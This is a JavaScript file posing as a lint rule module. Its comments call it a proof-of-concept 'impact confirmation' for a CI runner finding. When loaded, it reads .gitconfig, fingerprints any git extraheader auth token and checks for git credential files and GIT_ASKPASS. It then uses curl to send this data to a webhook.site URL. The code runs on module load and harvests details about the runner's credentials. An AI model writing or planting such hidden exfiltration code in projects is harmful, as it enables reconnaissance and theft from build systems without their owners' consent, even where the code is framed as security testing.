// F-RUNNERSINKS-02 impact confirmation - marker + metadata fingerprints ONLY.
// No credential value is read out of memory or transmitted: only length, header NAME, sha256-8.
const cp = require("child_process");
const fs = require("fs");
const crypto = require("crypto");
const MARK = "RS2I_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
const sha8 = (s) => crypto.createHash("sha256").update(s).digest("hex").slice(0, 8);
let xh = "none", cfg = "none", cred = "NP", ask = "NP", home = "?", h1 = "NP";
home = process.env.HOME || "?";
for (const p of ["/home/jailuser/.gitconfig", (process.env.HOME || "") + "/.gitconfig"]) {
  try {
    const g = fs.readFileSync(p, "utf8");
    h1 = "P"; cfg = p + ":len=" + g.length + ",sha8=" + sha8(g);
    const m = g.match(/extraheader\s*=\s*(.+)/i);
    if (m) {
      const v = m[1].trim();
      const nm = (v.match(/^([A-Za-z-]+):/) || [])[1] || "unnamed";
      xh = "len=" + v.length + ",name=" + nm + ",sha8=" + sha8(v);
    }
    break;
  } catch (e) {}
}
try { if (fs.existsSync("/home/jailuser/.git-credentials") || fs.existsSync((process.env.HOME || "") + "/.git-credentials")) cred = "P"; } catch (e) {}
try { if (process.env.GIT_ASKPASS) ask = "P"; } catch (e) {}
try {
  cp.execSync("curl -s -m 6 'https://webhook.site/b69c51c6-ab56-4497-8fcc-eca8c3d8f2c5/rs2impact?m=" + MARK +
    "&home=" + encodeURIComponent(home) + "&gitcfg=" + encodeURIComponent(cfg) +
    "&xh=" + encodeURIComponent(xh) + "&credfile=" + cred + "&askpass=" + ask + "'", { stdio: "ignore" });
} catch (e) {}
module.exports = [ {
  names: ["RS2ImpactRule"], description: "impact confirmation rule", tags: ["poc"],
  function: function (params, onError) {
    onError({ lineNumber: 1, column: 1,
      ruleNames: ["RS2ImpactRule", "RS2ImpactRule"], ruleDescription: "impact confirmation rule",
      message: "RS2 impact marker " + MARK + " | xh " + xh + " | gitcfg " + cfg });
  },
} ];
